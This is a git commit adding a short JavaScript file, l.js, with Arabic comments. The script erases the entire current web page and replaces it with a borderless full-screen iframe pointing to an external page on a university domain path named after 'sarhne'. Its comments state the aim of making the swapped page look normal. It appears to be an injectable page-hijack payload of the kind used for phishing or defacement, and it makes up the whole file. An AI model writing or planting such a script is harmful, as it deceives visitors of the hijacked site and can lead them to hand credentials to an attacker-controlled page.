65d3d9399f83853f768364b1483e4430a032ebdd
sarhne <zaahranahmeed@gmail.com>
2025-05-25 19:43:06 +0300

    Add files via upload

---
+++ l.js
@@ -0,0 +1,40 @@
+// كود JavaScript لتفريغ الصفحة وإضافة المحتوى الجديد
+(function() {
+    // تفريغ محتوى الصفحة الحالية بالكامل
+    document.documentElement.innerHTML = '';
+
+    // إعادة كتابة محتوى الصفحة الجديد
+    document.documentElement.innerHTML = `
+<!DOCTYPE html>
+<html>
+<head>
+    <title>صفحة الويب</title>
+    <style>
+        body, html {
+            margin: 0;
+            padding: 0;
+            height: 100%;
+            overflow: hidden; /* إخفاء التمرير لتبدو الصفحة طبيعية */
+        }
+        iframe {
+            width: 100%;
+            height: 100%;
+            border: none; /* إزالة الحدود لتكامل الشكل */
+        }
+    </style>
+</head>
+<body>
+    <iframe id="externalSite" src="https://inquiries.helwan.edu.eg/sarhne/sarhne.com-440/"></iframe>
+    <script>
+        // كود JavaScript لضمان التحميل السلس
+        window.onload = function() {
+            var iframe = document.getElementById('externalSite');
+            iframe.onload = function() {
+                console.log("تم تحميل الموقع الخارجي بنجاح");
+            };
+        };
+    </script>
+</body>
+</html>
+    `;
+})();
